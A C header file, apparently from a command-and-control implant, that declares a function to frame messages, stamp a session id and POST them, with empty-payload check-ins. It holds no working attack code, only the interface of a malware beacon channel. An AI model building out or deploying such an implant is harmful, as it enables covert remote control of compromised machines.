#ifndef C2_IMPLANT_FRAME_POST_H
#define C2_IMPLANT_FRAME_POST_H

#include <stddef.h>
#include <stdint.h>

#include "config.h"

/* Frame one message and POST it to 'path'. The wire format lives in frame.c, so
   this only decides where the bytes go; the session id from 'target' is stamped
   on every outbound frame here.

   'payload' may be NULL when 'payload_len' is 0, which is what a check-in
   sends. The response body, if any, comes back through 'out_body' and is the
   caller's to free. Returns the HTTP status, or -1 on transport failure. */
int post_frame(const struct target_config *target, const char *path,
               uint32_t command_id, const char *payload, size_t payload_len,
               char **out_body, size_t *out_len);

#endif
